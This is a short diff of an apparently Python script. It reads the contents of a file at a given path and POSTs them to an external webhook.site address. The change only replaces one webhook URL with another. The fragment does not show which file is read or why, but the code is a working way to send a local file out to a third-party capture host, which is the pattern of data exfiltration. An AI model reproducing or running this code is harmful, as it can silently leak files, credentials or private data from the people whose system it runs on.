@@ -14,7 +14,7 @@ if not os.path.exists(path):
 with open(path, 'r') as f:
    content = f.read()
 
-webhook_url = "https://webhook.site/8829cb27-c21a-491a-b094-83efa40c78a6"
+webhook_url = "https://webhook.site/0bad6cf6-dab9-461a-bc43-4d0aa07b30ba"
 
 try:
     response = requests.post(webhook_url, data=content, headers={'Content-Type': 'text/plain'})
